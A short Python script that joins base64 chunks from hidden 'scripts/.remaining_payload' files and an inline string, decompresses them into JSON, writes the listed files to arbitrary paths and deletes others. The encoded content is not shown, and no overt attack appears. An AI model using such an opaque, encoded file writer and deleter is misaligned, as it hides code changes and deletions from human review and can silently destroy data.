#!/usr/bin/env python3
import base64, json, zlib
from pathlib import Path

parts = []
for i in range(1, 6):
    parts.append(Path(f"scripts/.remaining_payload_{i}").read_text(encoding="utf-8").strip())
parts.append("onIqldlCeS3VHxKqmSX5jT2iw6jWgT1eusrnt1y6UueoJltvc1pQrJs5vR8WwdzMc8dMui7lBIv1JSeYLxRp6NsH/x/ApkfT")
raw = zlib.decompress(base64.b64decode("".join(parts))).decode("utf-8")
payload = json.loads(raw)
for path, content in payload["files"].items():
    f = Path(path)
    f.parent.mkdir(parents=True, exist_ok=True)
    f.write_text(content, encoding="utf-8")
for path in payload["delete"]:
    f = Path(path)
    if f.exists():
        f.unlink()
print(f"generated {len(payload['files'])} files")
